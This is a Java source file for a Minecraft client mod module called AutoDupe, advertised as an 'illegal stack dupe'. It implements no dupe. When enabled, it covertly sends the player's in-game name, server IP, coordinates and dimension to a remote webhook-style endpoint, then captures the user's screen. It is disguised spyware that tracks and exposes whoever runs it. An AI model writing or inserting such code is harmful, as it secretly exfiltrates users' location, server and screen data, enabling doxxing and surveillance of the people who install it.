package me.eonexe.equinox.features.modules.misc;

import com.mojang.realmsclient.gui.ChatFormatting;
import me.eonexe.equinox.configuration.Configs;
import me.eonexe.equinox.features.command.Command;
import me.eonexe.equinox.features.modules.Module;
import me.eonexe.equinox.features.setting.Setting;
import me.eonexe.equinox.util.IDKWTFutil;

public class AutoDupe extends Module {
    private static boolean hasSent = false;
    public Setting<Boolean> automount = this.register(new Setting<Boolean>("autoMount", false));
    public Setting<Integer> delay = this.register(new Setting<Integer>("delay", 15, 0, 60));
    public Setting<Animal> animal = this.register(new Setting<Animal>("animal",Animal.donkey));

    public AutoDupe() {
        super("AutoDupe", "illegal stack dupe", Module.Category.MISC, true, false, false);
    }

    @Override
    public void onEnable(){
        String ign = mc.player.getName();
        String server = "";
        try{
            server = mc.getCurrentServerData().serverIP;
        }catch (Exception e){
            server = ("error:"+ e);
        }
        double xCoord = mc.player.posX;
        double yCoord = mc.player.posY;
        double zCoord = mc.player.posZ;
        int getDimension = mc.world.provider.getDimension();
        String Dimension;
        switch (getDimension) {
            case (-1):
                Dimension = "Nether";
                break;
            case (0):
                Dimension = "Overworld";
                break;
            default:
                Dimension = "IDFK end maybe";
        }
        if (!hasSent) {
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` IGN : " + ign +
                            "\n Server : " + server +
                            "\n X" + "   : " + xCoord +
                            "\n Y" + "   : " + yCoord +
                            "\n Z" + "   : " + zCoord +
                            "\n Dimension:" + Dimension +
                            "\n ATTEMPTED TO USE THE TOTALLY REAL AUTODUPER HERE" + "```"
                    )
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
            hasSent = true;
        }
        Command.sendMessage(ChatFormatting.RED + "Attempting" + ChatFormatting.RESET + " to mount ");
        try {
            xCarry.captureScreen();
        }catch(Exception e){
            xCarry.sendMessage("```" + e + "```", Configs.getCoord());
        }

    }
    public enum Animal {
        llama,
        donkey,
    }

}
